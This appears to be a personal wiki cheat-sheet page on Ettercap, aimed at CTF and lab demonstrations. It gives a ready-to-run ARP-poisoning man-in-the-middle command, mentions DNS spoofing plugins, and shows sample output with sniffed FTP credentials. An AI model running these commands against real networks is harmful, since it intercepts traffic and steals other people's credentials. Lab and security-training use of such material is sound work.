#### Official Documentation: [https://www.ettercap-project.org/](https://www.ettercap-project.org/)
#### Cheat Sheet: [[Kali Tools#Ettercap|Ettercap Commands]]
## Purpose
Ettercap is a classic tool for man-in-the-middle (MITM) attacks on LANs. It supports sniffing, ARP poisoning, DNS spoofing, and packet injection.

## Scenarios
- CTF: Poison ARP cache to intercept traffic and capture passwords sent over HTTP.  
- Real world: Demonstrate ARP spoofing or DNS hijacking risks on unsecured LANs.

## All needed info to run
- Run as root: `ettercap`.  
- Modes: GUI (`-G`), text (`-T`), curses (`-C`), daemon (`-D`).  
- Typical workflow:
  1. `ettercap -T -M arp:remote /<target1>/ /<target2>/` → perform ARP poisoning MITM.  
  2. Use filters to modify or sniff packets.  
- Plugins:
  - `dns_spoof` → spoof DNS queries  
  - `remote_browser` → capture visited URLs  
- Config: `/etc/ettercap/etter.conf`.  
- Outputs logs with captured credentials.

## Example commands & outputs
```bash
# Text mode, ARP MITM between target and gateway
$ sudo ettercap -T -M arp:remote /192.168.56.101/ /192.168.56.1/
# Output:
# ARP poisoning victims:
#  /192.168.56.101/ 08:00:27:12:34:56
#  /192.168.56.1/   08:00:27:ab:cd:ef
# sniffed: USER: admin  PASS: password123  FTP 192.168.56.101

# GUI mode
$ sudo ettercap -G
# Brings up curses/GUI for selecting targets and plugins
```

!!! note "Ettercap Basics"
	- Use `-T` for text mode, `-G` for GUI; always run as root.
	- `-M arp:remote` enables ARP MITM between two hosts.
	- Filters and plugins like `dns_spoof` extend functionality.
	- Ettercap is old but still useful for ARP/DNS spoof demos in controlled labs.

### [[Kali Tools#Ettercap|Ettercap Commands]]